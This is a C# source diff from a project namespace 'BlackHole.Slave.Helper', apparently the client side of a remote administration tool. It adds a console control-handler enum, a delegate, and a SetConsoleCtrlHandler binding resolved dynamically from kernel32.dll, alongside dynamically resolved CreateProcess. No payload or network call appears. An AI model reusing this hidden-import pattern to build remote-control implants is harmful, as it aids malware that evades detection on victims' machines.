@@ -81,8 +81,20 @@ namespace BlackHole.Slave.Helper
                 public IntPtr hStdOutput;
                 public IntPtr hStdError;
             }
+
+            public enum CtrlType
+            {
+                CTRL_C_EVENT = 0,
+                CTRL_BREAK_EVENT = 1,
+                CTRL_CLOSE_EVENT = 2,
+                CTRL_LOGOFF_EVENT = 5,
+                CTRL_SHUTDOWN_EVENT = 6
+            }
+
+            public delegate bool ConsoleHandler(CtrlType ctrl);
+
             #endregion
-            
+
             [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
             public delegate bool dCreateProcess(
                 string lpApplicationName,
@@ -98,9 +110,13 @@ namespace BlackHole.Slave.Helper
 
             [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
             public delegate int dGetCurrentThreadId();
-
+            
+            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
+            public delegate bool dSetConsoleCtrlHandler(ConsoleHandler handler, bool add);
+   
             public static dGetCurrentThreadId GetCurrentThreadId = DynamicNativeCall<dGetCurrentThreadId>("kernel32.dll", "GetCurrentThreadId");
             public static dCreateProcess CreateProcess = DynamicNativeCall<dCreateProcess>("kernel32.dll", "CreateProcessW");
+            public static dSetConsoleCtrlHandler SetConsoleCtrlHandler = DynamicNativeCall<dSetConsoleCtrlHandler>("kernel32.dll", "SetConsoleCtrlHandler");
         }
 
         public static class user32
